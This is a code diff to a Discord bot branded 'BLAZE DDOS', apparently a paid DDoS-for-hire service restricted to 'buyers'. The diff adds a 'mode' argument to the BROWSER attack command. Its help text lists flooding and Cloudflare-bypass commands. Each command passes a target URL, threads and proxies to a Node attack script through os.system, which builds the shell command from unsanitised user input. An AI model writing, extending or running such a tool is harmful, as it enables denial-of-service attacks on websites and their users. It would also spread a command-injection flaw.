@@ -266,7 +266,7 @@ async def Commands(ctx):
 		embed.add_field(name="**HTTP-RAW**", value="```!HTTP_RAW [url] [time]```")
 		embed.add_field(name="**HTTP-RAND**", value="```!HTTP_RAND [url] [time]```")
 		embed.add_field(name="**HTTP-SOCKETS**", value="```!HTTP_SOCKETS [url] [request/ip] [time]```")
-		embed.add_field(name="**BROWSER**", value="```!HTTP-BROWSER IF CANT !BROWSER [url] [time] {threads} {req} {proxy} ```")
+		embed.add_field(name="**BROWSER**", value="```!HTTP-BROWSER IF CANT !BROWSER [url] [mode] [time] [threads] [req] [proxy] ```")
 		embed.add_field(name="**IO-STRESSER**", value="```!IO_STRESSER [url] [time] [thread] [bypass/proxy]```")
 		embed.add_field(name="**CLOUDFLARE**", value="```!CF [url] [time] [thread]```")
 		embed.add_field(name="**CF-BYPASS**", value="```!CF_BYPASS [url] [thread<50] [time]```")
@@ -363,7 +363,7 @@ async def DDOS(ctx, url, time):
 		
 @bot.command()
 
-async def BROWSER(ctx, url, threads, time , req ,proxy):
+async def BROWSER(ctx, url, threads, time , req , mode , proxy):
 
 	if ctx.author.id not in buyers:		embedc = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=0xfcb103)
 
@@ -386,7 +386,9 @@ async def BROWSER(ctx, url, threads, time , req ,proxy):
 		embed.add_field(name="**Threads**", value=f"`{threads}`")
 
                 embed.add_field(name="**Request**", value=f"` {req}`")
-
+		
+                embed.add_field(name="**Mode**", value=f"` {mode}`")
+	
 		embed.add_field(name="**Proxy**", value=f"`{proxy}`")
 
 		
@@ -407,7 +409,7 @@ async def BROWSER(ctx, url, threads, time , req ,proxy):
 
 		
 
-		os.system(f"node HTTP-BROWSER.js {target} {time} {threads} {req} {proxy}")
+		os.system(f"node HTTP-BROWSER.js {mode} {target} {time} {threads} {req} {proxy}")
 		
 		
 		
